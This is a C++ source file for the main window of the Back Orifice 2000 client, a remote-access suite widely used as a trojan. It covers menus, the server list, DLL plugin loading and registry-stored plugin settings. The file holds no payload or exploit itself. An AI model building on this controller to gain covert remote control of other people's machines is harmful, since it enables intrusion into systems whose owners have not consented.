/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "bo2kgui.h"
#include "MainFrm.h"
#include "pluginconfig.h"
#include <auth.h>
#include <nullauth.h>
#include <iohandler.h>
#include <io_simpleudp.h>
#include <io_simpletcp.h>
#include <encryption.h>
#include <xorencrypt.h>
#include <deshash.h>
#include <dll_load.h>
#include <plugins.h>
#include <interactiveconnect.h>
#include <interactivelisten.h>
#include "Splash.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;	
#endif


#define WM_CDIALOG_DO_MODAL (WM_USER+123)
#define WM_TASKBAR_CALLBACK (WM_USER+124)

typedef struct {
	CDialog *pDialog;
	int nRet;
	HANDLE hTrigger;
} CDIALOGDOMODALPARAM;


/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CCJFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CCJFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_COMMAND(IDM_SERVERLIST, OnServerlist)
	ON_UPDATE_COMMAND_UI(IDM_SERVERLIST, OnUpdateServerlist)
	ON_WM_ERASEBKGND()
	ON_COMMAND(IDM_PLUGINS, OnPlugins)
	ON_COMMAND(IDM_GRADIENTS, OnGradients)
	ON_UPDATE_COMMAND_UI(IDM_GRADIENTS, OnUpdateGradients)
	ON_COMMAND(IDM_MENUTYPE, OnMenuType)
	ON_UPDATE_COMMAND_UI(IDM_MENUTYPE, OnUpdateMenuType)
	ON_COMMAND(ID_SERVER_NEW, OnServerNew)
	ON_UPDATE_COMMAND_UI(ID_SERVER_NEW, OnUpdateServerNew)
	ON_COMMAND(ID_SERVER_EDIT, OnServerEdit)
	ON_UPDATE_COMMAND_UI(ID_SERVER_EDIT, OnUpdateServerEdit)
	ON_COMMAND(ID_SERVER_DELETE, OnServerDelete)
	ON_UPDATE_COMMAND_UI(ID_SERVER_DELETE, OnUpdateServerDelete)
	ON_WM_ACTIVATE()
//	ON_COMMAND(IDM_SYSTRAY, OnSysTray)
//	ON_UPDATE_COMMAND_UI(IDM_SYSTRAY, OnUpdateSysTray)
//	ON_MESSAGE(WM_TASKBAR_CALLBACK, OnTrayNotification)
	ON_COMMAND_RANGE(IDM_PLUGIN_0,IDM_PLUGIN_4095,OnPluginMenu)
	ON_WM_TIMER()
	ON_WM_SHOWWINDOW()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_INDICATOR_CAPS,
	ID_INDICATOR_NUM,
	ID_INDICATOR_SCRL,
};

/////////////////////////////////////////////////////////////////////////////
// The global handler objects

CIOHandler *g_pIOHandler;
CEncryptionHandler *g_pEncryptionHandler;
CAuthHandler *g_pAuthHandler;

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	m_pWndServerList=NULL;
	m_bGradients=FALSE;
//	m_bSysTray=FALSE;
//	m_pTrayIcon=NULL;
	
	g_pIOHandler=NULL;
	g_pEncryptionHandler=NULL;
	g_pAuthHandler=NULL;

	m_arrPluginInfo.RemoveAll();
	m_arrVarInfo.RemoveAll();

}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CCJFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	// Get config
	m_bGradients=AfxGetApp()->GetProfileInt("Config","Gradients",FALSE);
	m_bScreenReader=AfxGetApp()->GetProfileInt("Config","Compatible Menus",TRUE);
//	m_bSysTray=AfxGetApp()->GetProfileInt("Config","System Tray",0);

	// Start up toolbars and docking windows
	CSize defaultSize(GetSystemMetrics(SM_CXSCREEN)/4,GetSystemMetrics(SM_CYSCREEN)/5);
	SetInitialSize(defaultSize.cy,defaultSize.cy,defaultSize.cx,defaultSize.cx);
	EnableDocking(CBRS_ALIGN_ANY);
	EnableDockingSizeBar(CBRS_ALIGN_ANY);

	if(InitializeToolbars()==-1) return FALSE;
	if(InitializeDockingWindows()==-1) return FALSE;

	// Load up built-in IO and plugins
	if(InitializePlugins()==-1) return FALSE;	

	CSplash spl;
	spl.DoModal();

	return 0;
}


int CMainFrame::InitializeToolbars()
{
	// Create main toolbar
	if (!m_wndTBMain.Create(this) ||
		!m_wndTBMain.LoadToolBar(IDR_MAINFRAME)) {
		TRACE0("Failed to create main toolbar\n");
		return -1;      // fail to create
	}
	m_wndTBMain.SetWindowText(_T("Main toolbar"));
	m_wndTBMain.SetBarStyle(m_wndTBMain.GetBarStyle() | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndTBMain.EnableDocking(CBRS_ALIGN_ANY);
	m_wndTBMain.SetButtonSize(CSize(24,22));
	
	// Create main menu bar
	m_menuBar.m_bAutoRemoveFrameMenu=FALSE;
	m_menuBar.Create(this, WS_CHILD | WS_VISIBLE | CBRS_TOP, IDR_MAINFRAME);
	m_menuBar.LoadMenu(GetMenu()->GetSafeHmenu());
		
	m_menuBar.SetWindowText(_T("Menu"));
	m_menuBar.SetBarStyle(m_menuBar.GetBarStyle() | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_menuBar.EnableDocking(CBRS_ALIGN_TOP | CBRS_ALIGN_BOTTOM);
	m_menuBar.SetButtonSize(CSize(24,22));

	m_menuManager.Install(this);
	m_menuManager.LoadToolbar(IDR_MAINFRAME);
		
	if(m_bScreenReader) {
		m_menuManager.m_bShowButtons=FALSE;
		m_menuManager.Refresh();
		m_menuBar.ShowWindow(SW_HIDE);
		DockControlBar(&m_wndTBMain);
	} else {
		m_menuManager.m_bShowButtons=TRUE;
		m_menuManager.Refresh();
		
		m_menuBar.ShowWindow(SW_SHOW);
		SetMenu(NULL);
		DockControlBar(&m_menuBar);

		DockControlBarLeftOf(&m_wndTBMain,&m_menuBar);
		DockControlBar(&m_wndTBMain);
	}
	
	return 0;
}

int CMainFrame::InitializeDockingWindows()
{
	// Create workspace dockbar
	CString title("Server List");
	if (!m_wndServerListBDB.Create(this,  IDD_SERVERLIST, title)) {
		TRACE0("Failed to create dialogbar\n");
		return -1;      // fail to create
	}
	m_wndServerListBDB.SetBarStyle((m_wndServerListBDB.GetBarStyle() & ~CBRS_ALIGN_ANY) |
		CBRS_TOOLTIPS | CBRS_BOTTOM | CBRS_FLYBY | CBRS_SIZE_DYNAMIC);
	m_wndServerListBDB.EnableDockingOnSizeBar(CBRS_ALIGN_ANY);

	
	m_pWndServerList=new CServerList();
	m_pWndServerList->Create(CServerList::IDD,&m_wndServerListBDB);
	m_wndServerListBDB.SetDialog(m_pWndServerList);
	m_pWndServerList->UseGradient(m_bGradients);

	DockSizeBar(&m_wndServerListBDB);

	CMenu menu;
	menu.Attach(m_menuBar.GetMenu());
	menu.CheckMenuItem(IDD_SERVERLIST, MF_CHECKED);
	menu.Detach();
	
	return 0;
}




/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CCJFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CCJFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers


void CMainFrame::OnServerlist() 
{
	if(m_wndServerListBDB.IsWindowVisible()) {
		ShowControlBar(&m_wndServerListBDB, FALSE, FALSE);
	} else {
		ShowControlBar(&m_wndServerListBDB, TRUE, FALSE);
	}	
}

void CMainFrame::OnUpdateServerlist(CCmdUI* pCmdUI) 
{
	if(m_wndServerListBDB.IsWindowVisible()) {
		pCmdUI->SetCheck(1);
	} else {
		pCmdUI->SetCheck(0);
	}
}

BOOL CMainFrame::DestroyWindow() 
{

	// Clean up server list
	if(m_pWndServerList) {
		m_pWndServerList->CleanUpAndClose();
		delete m_pWndServerList;
		m_pWndServerList=NULL;
	}		

	// Kill all the plugins
	TerminatePlugins();

//	AfxGetApp()->WriteProfileInt("Config","System Tray",m_bSysTray);
	AfxGetApp()->WriteProfileInt("Config","Compatible Menus",m_bScreenReader);
	AfxGetApp()->WriteProfileInt("Config","Gradients",m_bGradients);

	// Delete the tray icon
//	if(m_pTrayIcon) {
//		delete m_pTrayIcon;
//		m_pTrayIcon=NULL;
//	}

	return CCJFrameWnd::DestroyWindow();
}

BOOL CMainFrame::OnEraseBkgnd(CDC* pDC) 
{
	return TRUE;
	//return CCJFrameWnd::OnEraseBkgnd(pDC);
}

void CMainFrame::OnPlugins() 
{
	CPluginConfig cpg;

	cpg.DoModal();
}

void CMainFrame::OnGradients() 
{
	m_bGradients=!m_bGradients;
	
	m_pWndServerList->UseGradient(m_bGradients);
}

void CMainFrame::OnUpdateGradients(CCmdUI* pCmdUI) 
{
	if(m_bGradients) pCmdUI->SetCheck(1);
	else pCmdUI->SetCheck(0);
}

void CMainFrame::OnMenuType() 
{
	m_bScreenReader=!m_bScreenReader;
	
	if(m_bScreenReader) {
		m_menuManager.m_bShowButtons=FALSE;
		m_menuManager.Refresh();

		DockControlBar(&m_menuBar);
		m_menuBar.ShowWindow(FALSE);
		SetMenu(CMenu::FromHandle(m_menuBar.GetMenu()));
		FloatControlBar(&m_wndTBMain,CPoint(0,0));
		DockControlBar(&m_wndTBMain);
	} else {
		m_menuManager.m_bShowButtons=TRUE;
		m_menuManager.Refresh();
		
		SetMenu(NULL);
		m_menuBar.ShowWindow(TRUE);
		DockControlBar(&m_menuBar);
		DockControlBarLeftOf(&m_wndTBMain,&m_menuBar);
		DockControlBar(&m_wndTBMain);
	}


}

void CMainFrame::OnUpdateMenuType(CCmdUI* pCmdUI) 
{
	if(m_bScreenReader)
		pCmdUI->SetCheck(1);
	else 
		pCmdUI->SetCheck(0);
}

void CMainFrame::OnServerNew()
{
	m_pWndServerList->OnNewmachine();
}

void CMainFrame::OnUpdateServerNew(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_pWndServerList->GetDlgItem(ID_NEWMACHINE)->IsWindowEnabled());	
}

void CMainFrame::OnServerEdit()
{
	m_pWndServerList->OnEditmachine();
}

void CMainFrame::OnUpdateServerEdit(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_pWndServerList->GetDlgItem(ID_EDITMACHINE)->IsWindowEnabled());
}

void CMainFrame::OnServerDelete()
{
	m_pWndServerList->OnDeletemachine();
}

void CMainFrame::OnUpdateServerDelete(CCmdUI* pCmdUI)
{
	pCmdUI->Enable(m_pWndServerList->GetDlgItem(ID_DELETEMACHINE)->IsWindowEnabled());	
}

void CMainFrame::OnSysTray()
{
/*	m_bSysTray=!m_bSysTray;
	if(m_bSysTray) {
		m_pTrayIcon=new CTrayIcon(IDR_TRAYICON);
		m_pTrayIcon->SetNotificationWnd(this,WM_TASKBAR_CALLBACK);
	} else {
		delete m_pTrayIcon;
		m_pTrayIcon=NULL;
	}*/
}

void CMainFrame::OnUpdateSysTray(CCmdUI* pCmdUI)
{
//	pCmdUI->SetCheck(m_bSysTray);	
}



int CMainFrame::RegisterClientMenu(LPCSTR szCategory, LPCSTR szComName, TYPEOF_ClientMenu *pProc)
{
	CMenu menu, *pMenu, *pSubMenu;
	
	// Add to plugins menu
	menu.Attach(m_menuBar.GetMenu());
	pMenu=menu.GetSubMenu(3);
	if(pMenu==NULL) return -1;
	menu.Detach();
	
	// Find/create submenu for plugin
	int i,count;
	count=pMenu->GetMenuItemCount();
	for(i=2;i<count;i++) {
		CString str;
		pMenu->GetMenuString(i,str,MF_BYPOSITION);
		if(str.CompareNoCase(szCategory)==0) break;
	}
	if(i==count) {
		pSubMenu=new CMenu();
		if(pSubMenu==NULL) return -1;
		pSubMenu->CreatePopupMenu();

		pMenu->InsertMenu(i,MF_POPUP|MF_STRING|MF_ENABLED,(UINT)pSubMenu->GetSafeHmenu(),szCategory);		
	} else {
		pSubMenu=pMenu->GetSubMenu(i);
	}

	// Find empty id;
	int nId;
	nId=0;
	count=m_arrPluginMenuItems.GetSize();
	
	i=0;
	while(i!=count) {
		for(i=0;i<count;i++) {
			if(m_arrPluginMenuItems[i].nId==nId) {
				nId++;
				break;
			}
		}
	}

	// Insert item for plugin
	PLUGINMENUITEM pmi;
	pmi.nId=nId;
	pmi.pProc=pProc;
	
	m_arrPluginMenuItems.Add(pmi);
	pSubMenu->AppendMenu(MF_STRING|MF_ENABLED,IDM_PLUGIN_0+nId,szComName);
	
	return 0;
}

int CMainFrame::UnregisterClientMenu(LPCSTR szCategory, LPCSTR szComName)
{
	CMenu menu, *pMenu, *pSubMenu;
	
	// Remove from plugins menu
	menu.Attach(m_menuBar.GetMenu());
	pMenu=menu.GetSubMenu(3);
	if(pMenu==NULL) return -1;
	menu.Detach();
		
	
	// Find submenu for plugin
	int k,count;
	count=pMenu->GetMenuItemCount();
	for(k=2;k<count;k++) {
		CString str;
		pMenu->GetMenuString(k,str,MF_BYPOSITION);
		if(str.CompareNoCase(szCategory)==0) break;
	}
	if(k==count) {
		return -1;
	} else {
		pSubMenu=pMenu->GetSubMenu(k);
	}

	// Find menu item
	int i;
	count=pSubMenu->GetMenuItemCount();
	for(i=0;i<count;i++) {
		CString str;
		pSubMenu->GetMenuString(i,str,MF_BYPOSITION);
		if(str.CompareNoCase(szComName)==0) break;
	}
	if(i==count) return -1;
	
	// Remove menu item
	int j,pcount,nId;
	nId=pSubMenu->GetMenuItemID(i)-IDM_PLUGIN_0;
	pSubMenu->RemoveMenu(i,MF_BYPOSITION);
	if(count==1) {
		pMenu->RemoveMenu(k,MF_BYPOSITION);
		delete pSubMenu;
	}
	
	pcount=m_arrPluginMenuItems.GetSize();
	for(j=pcount-1;j>=0;j--) {
		if(m_arrPluginMenuItems[j].nId==nId) {
			m_arrPluginMenuItems.RemoveAt(j);
			break;
		}
	}
	if(j==-1) return -1;
	

	return 0;
}

int CMainFrame::InitializePlugins()
{
	// Start DLL Loader
	InitializeDLLLoad();

	// Start IO Subsystem
	g_pIOHandler=new CIOHandler();
	if(g_pIOHandler==NULL) return -1;

	// Start Encryption Subsystem
	g_pEncryptionHandler=new CEncryptionHandler();
	if(g_pEncryptionHandler==NULL) return -1;

	// Start Authentication Subsystem
	g_pAuthHandler=new CAuthHandler();
	if(g_pAuthHandler==NULL) return -1;

	// Add built-in stuff
	g_pIOHandler->Insert(GetSimpleUdpIOHandler());
	g_pIOHandler->Insert(GetSimpleTcpIOHandler());	
	g_pEncryptionHandler->Insert(GetXOREncryptionEngine());
	//g_pEncryptionHandler->Insert(GetDESEncryptionEngine());
	g_pAuthHandler->Insert(GetNullAuthHandler());
	
	// Install plugins
	int i,count;
	count=AfxGetApp()->GetProfileInt("Plugins","Count",0);
	for(i=0;i<count;i++) {
		CString strKey,strValue;
		strKey.Format("Plugin_%d",i);
		strValue=AfxGetApp()->GetProfileString("Plugins",strKey,NULL);
		
		AddPlugin(strValue);
	}
	
	// Add variables for client executable
	char *base=(char *)AfxGetInstanceHandle();
	PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET(base);
	AddVariables(base, poh->SizeOfImage, -1);
	LoadPluginConfig(-1);

	return 0;
}

int CMainFrame::TerminatePlugins()
{
	// Save client config
	SavePluginConfig(-1);

	// Unload plugins
	int i,count;
	count=m_arrPluginInfo.GetSize();
	AfxGetApp()->WriteProfileInt("Plugins","Count",count);
	for(i=(count-1);i>=0;i--) {
		CString strKey;
		strKey.Format("Plugin_%d",i);
		AfxGetApp()->WriteProfileString("Plugins",strKey,m_arrPluginInfo[i].svFilename);

		RemovePlugin(i);
	}
	
	// Purge extra registry keys
	i=count; 
	while(1) {
		CString strKey;
		strKey.Format("Plugin_%d",i);
		if(AfxGetApp()->GetProfileString("Plugins",strKey).IsEmpty()) break;
		AfxGetApp()->WriteProfileString("Plugins",strKey,NULL);
		i++;
	}

	// Terminate Auth Subsystem
	if(g_pAuthHandler!=NULL) {
		for(i=0;i<MAX_AUTH_HANDLERS;i++) {
			g_pAuthHandler->Remove(i);
		}
		delete g_pAuthHandler;
	}

	// Terminate Encryption Subsystem
	if(g_pEncryptionHandler!=NULL) {
		for(i=0;i<MAX_ENCRYPTION_ENGINES;i++) {
			g_pEncryptionHandler->Remove(i);
		}
		delete g_pEncryptionHandler;
	}

	// Terminate IO Subsystem
	if(g_pIOHandler!=NULL) {
		for(i=0;i<MAX_IO_HANDLERS;i++) {
			g_pIOHandler->Remove(i);
		}
		delete g_pIOHandler;
	}

	// Stop DLL Loader
	KillDLLLoad();

	return 0;
}

int CMainFrame::AddPlugin(CString strPath)
{
	PLUGIN_INFO pi;
				
	pi.pPluginImage=NULL;
	pi.dwPluginLen=0;
	pi.svFilename[0]=0;
	pi.svDescription[0]=0;
	pi.wVersionLo=0;
	pi.wVersionHi=0;
	pi.wBOVersionLo=0;
	pi.wBOVersionHi=0;


	// Load Plugin DLL 
	HINSTANCE hDLL;
	hDLL=LoadLibrary(strPath);
	if(hDLL==NULL)
		hDLL=LoadDLL(strPath);

	if(hDLL!=NULL) {
		pi.pPluginImage=(BYTE *)hDLL;
		PIMAGE_OPTIONAL_HEADER poh=(PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET(pi.pPluginImage);
		pi.dwPluginLen=poh->SizeOfImage;

		// Call plugin version information function
		PLUGIN_VERSION pv;
		TYPEOF_PluginVersion *PluginVersion=(TYPEOF_PluginVersion *)GetDLLProcAddress(hDLL,"PluginVersion");
		if(PluginVersion!=NULL) {
			if(PluginVersion(&pv)) {
				// Copy plugin version information
				lstrcpyn(pi.svFilename,strPath,MAX_PATH+1);
				lstrcpyn(pi.svDescription,pv.svDescription,256);
				pi.wVersionLo=pv.wVersionLo;
				pi.wVersionHi=pv.wVersionHi;
				pi.wBOVersionLo=pv.wBOVersionLo;
				pi.wBOVersionHi=pv.wBOVersionHi;
			}
		}
		
		// Extract variable list
		int nPlugin=m_arrPluginInfo.Add(pi);
		if(nPlugin>=0) {
			AddVariables((char *)pi.pPluginImage,pi.dwPluginLen,nPlugin);
			LoadPluginConfig(nPlugin);
		} else {
			FreeDLL(hDLL);
			FreeLibrary(hDLL);	
		}

		// Start plugin
		PLUGIN_LINKAGE pl;
			
		pl.pDispatchCommand=NULL;
		pl.pEncryptionHandler=g_pEncryptionHandler;
		pl.pIOHandler=g_pIOHandler;
		pl.pIssueAuthCommandRequest=&IssueAuthCommandRequest;
		pl.pIssueAuthCommandReply=&IssueAuthCommandReply;
		pl.pRegisterClientMenu=&::RegisterClientMenu;
		pl.pRegisterCommand=NULL;
		pl.pUnregisterClientMenu=&::UnregisterClientMenu;
		pl.pUnregisterCommand=NULL;
		pl.pListenAuthSocket=&ListenAuthSocket;
		pl.pConnectAuthSocket=&ConnectAuthSocket;
		pl.pInteractiveConnect=&InteractiveConnect;
		pl.pInteractiveListen=&InteractiveListen;
		
		TYPEOF_InstallPlugin *InstallPlugin=(TYPEOF_InstallPlugin *)GetDLLProcAddress(hDLL,"InstallPlugin");
		if(InstallPlugin(pl)==-1) {
			AfxMessageBox("Error installing plugin.",MB_OK|MB_ICONWARNING|MB_SETFOREGROUND|MB_TOPMOST);
			RemovePlugin(nPlugin);
			return -1;
		}
		
		return nPlugin;
	}

	return -1;
}

int CMainFrame::RemovePlugin(int nPlugin)
{
	if(nPlugin>=m_arrPluginInfo.GetSize()) return -1;
	if(nPlugin<0) return -1;

	HMODULE hDLL=(HMODULE)m_arrPluginInfo[nPlugin].pPluginImage;

	// Terminate plugin
	TYPEOF_TerminatePlugin *TerminatePlugin=(TYPEOF_TerminatePlugin *)GetDLLProcAddress(hDLL,"TerminatePlugin");
	TerminatePlugin();

	// Save plugin configuration to registry
	if(SavePluginConfig(nPlugin)==-1) {
		AfxMessageBox("Unable to save plugin config to registry",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);
	}
		
	// Remove from memory and plugin info list
	FreeDLL(hDLL);
	FreeLibrary(hDLL);

	m_arrPluginInfo.RemoveAt(nPlugin);
	
	return 0;
}



void CMainFrame::AddVariables(char *pBuffer, DWORD dwLen, int nPlugin)
{
	DWORD pos;
	for(pos=0;pos<dwLen-10;pos++) {
		if(memcmp(pBuffer+pos,"<**CFG**>",9)==0) {
			pos+=9;
			// Get category name
			VARIABLE_INFO vi;
			lstrcpyn(vi.svCategory,pBuffer+pos,256);
			pos+=(lstrlen(pBuffer+pos)+1);
			
			// Go through all variables
			while(*(pBuffer+pos)!='\0') {
				DWORD dwValPos;
				vi.VarType=*(pBuffer+pos);
				if(vi.VarType=='B') {
					pos+=2;
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					vi.nStrLen=1;
					pos+=2;
				} else if(vi.VarType=='N') {
					// Get Number Range
					pos+=2;
					vi.nNumLo=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=',') pos++;
					pos++;
					vi.nStrLen=pos;
					vi.nNumHi=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					vi.nStrLen=pos-vi.nStrLen;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					pos+=(vi.nStrLen+1);
				} else if(vi.VarType=='S') {
					// Get Number Range
					pos+=2;
					vi.nStrLen=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					dwValPos=pos;
					pos+=(vi.nStrLen+1);
				} else {
					AfxMessageBox("Error parsing variables. Variable list could not be determined.");
					return;
				}
				
				// Add to variable info array
				vi.nPlugin=nPlugin;
				vi.dwPos=dwValPos;
				m_arrVarInfo.Add(vi);
				
			}
		}
	}
}


int CMainFrame::LoadPluginConfig(int nNum)
{
	int i,count;
	
	count=m_arrVarInfo.GetSize();

	char *base;
	if(nNum==-1) {
		base=(char *)AfxGetInstanceHandle();
	} else {
		base=(char *)m_arrPluginInfo[nNum].pPluginImage;	
	}
	
	for(i=0;i<count;i++) {
		VARIABLE_INFO vi=m_arrVarInfo[i];
		if(vi.nPlugin==nNum) {
			CString str;
			str=AfxGetApp()->GetProfileString(vi.svCategory,vi.svVarName,base+vi.dwPos);
			lstrcpyn(base+vi.dwPos,str,vi.nStrLen+1);
		}
	}

	return 0;
}

int CMainFrame::SavePluginConfig(int nNum)
{
	int i,count;
	
	count=m_arrVarInfo.GetSize();

	char *base;
	if(nNum==-1) {
		base=(char *)AfxGetInstanceHandle();
	} else {
		base=(char *)m_arrPluginInfo[nNum].pPluginImage;	
	}
	
	for(i=0;i<count;i++) {
		VARIABLE_INFO vi=m_arrVarInfo[i];
		if(vi.nPlugin==nNum) {
			AfxGetApp()->WriteProfileString(vi.svCategory,vi.svVarName,base+vi.dwPos);
		}
	}
	
	return 0;
}


void CMainFrame::OnPluginMenu(UINT nID) 
{
	// Find id
	int i,count;
	
	count=m_arrPluginMenuItems.GetSize();
	for(i=0;i<count;i++) {
		if(m_arrPluginMenuItems[i].nId==(int)(nID-IDM_PLUGIN_0)) break;
	}
	if(i==count) return;
	
	// Call plugin procedure
	
	int nRet=m_arrPluginMenuItems[i].pProc(GetSafeHwnd());

	if(nRet==-1) {
		AfxMessageBox("An error occurred while starting up the plugin.\nThings may not proceed as planned.\n",MB_OK|MB_ICONWARNING|MB_SETFOREGROUND|MB_TOPMOST);
	}

}

BOOL CMainFrame::PreTranslateMessage(MSG *pMsg)
{
	m_menuBar.TranslateFrameMessage(pMsg);
	
	return CCJFrameWnd::PreTranslateMessage(pMsg);
}


LRESULT CMainFrame::WindowProc(UINT message, WPARAM wParam, LPARAM lParam) 
{
	switch(message) {
	case WM_CDIALOG_DO_MODAL: 
		{
			CDialog *cdlg=((CDIALOGDOMODALPARAM *)lParam)->pDialog;
			int nRet=cdlg->DoModal();
			((CDIALOGDOMODALPARAM *)lParam)->nRet=nRet;
			SetEvent(((CDIALOGDOMODALPARAM *)lParam)->hTrigger);
			return TRUE;
		}
	}
	
	return CCJFrameWnd::WindowProc(message, wParam, lParam);
}

int CMainFrame::DoDialogModal(CDialog *dlg)
{
	MSG msg;
	CDIALOGDOMODALPARAM cddmp;
	cddmp.pDialog=dlg;
	cddmp.nRet=-1;
	cddmp.hTrigger=CreateEvent(NULL,TRUE,FALSE,NULL);
	PostMessage(WM_CDIALOG_DO_MODAL,0,(LPARAM)&cddmp);
	while(WaitForSingleObject(cddmp.hTrigger,0)!=WAIT_OBJECT_0) {
		if(PeekMessage(&msg,NULL,0,0,PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		Sleep(20);
	}
	CloseHandle(cddmp.hTrigger);
	return cddmp.nRet;
}

// Global callbacks for plugins

int RegisterClientMenu(LPCSTR szCategory, LPCSTR szComName, TYPEOF_ClientMenu *pProc)
{
	return ((CMainFrame *)AfxGetMainWnd())->RegisterClientMenu(szCategory,szComName, pProc);
}

int UnregisterClientMenu(LPCSTR szCategory, LPCSTR szComName)
{
	return ((CMainFrame *)AfxGetMainWnd())->UnregisterClientMenu(szCategory,szComName);
}


int InteractiveConnect(HWND hParent, LPCSTR svBindStr,LPCSTR svNetMod,LPCSTR svEncryption,LPCSTR svAuth,char *svRBindStr,char *svRNetMod,char *svREncryption,char *svRAuth)
{
	CMainFrame *pcmf=(CMainFrame *)AfxGetMainWnd();
	CWnd *pWnd=CWnd::FromHandle(hParent);
	CInteractiveConnect cic(pWnd);
	
	cic.m_strSvrAddr=svBindStr;
	cic.m_strSelectedIO=svNetMod;
	cic.m_strSelectedEnc=svEncryption;
	cic.m_strSelectedAuth=svAuth;
	
	if(pcmf->DoDialogModal(&cic)==IDOK) {
		lstrcpyn(svRBindStr,cic.m_strSvrAddr,256);
		lstrcpyn(svRNetMod,cic.m_strSelectedIO,256);
		lstrcpyn(svREncryption,cic.m_strSelectedEnc,256);
		lstrcpyn(svRAuth,cic.m_strSelectedAuth,256);
		return 0;
	}
	return -1;
}

int InteractiveListen(HWND hParent, LPCSTR svBindStr,LPCSTR svNetMod,LPCSTR svEncryption,LPCSTR svAuth,char *svRBindStr,char *svRNetMod,char *svREncryption,char *svRAuth)
{
	CMainFrame *pcmf=(CMainFrame *)AfxGetMainWnd();
	CWnd *pWnd=CWnd::FromHandle(hParent);
	CInteractiveListen cil(pWnd);
	 
	cil.m_strSvrAddr=svBindStr;
	cil.m_strSelectedIO=svNetMod;
	cil.m_strSelectedEnc=svEncryption;
	cil.m_strSelectedAuth=svAuth;
	if(pcmf->DoDialogModal(&cil)==IDOK) {
		lstrcpyn(svRBindStr,cil.m_strSvrAddr,256);
		lstrcpyn(svRNetMod,cil.m_strSelectedIO,256);
		lstrcpyn(svREncryption,cil.m_strSelectedEnc,256);
		lstrcpyn(svRAuth,cil.m_strSelectedAuth,256);
		return 0;
	}
	return -1;
}


void CMainFrame::OnActivate(UINT nState, CWnd* pWndOther, BOOL bMinimized) 
{
	CCJFrameWnd::OnActivate(nState, pWndOther, bMinimized);
}


/*LRESULT CMainFrame::OnTrayNotification(WPARAM uID, LPARAM lEvent)
{
   // let tray icon do default stuff
   return m_pTrayIcon->OnTrayNotification(uID, lEvent);
}
*/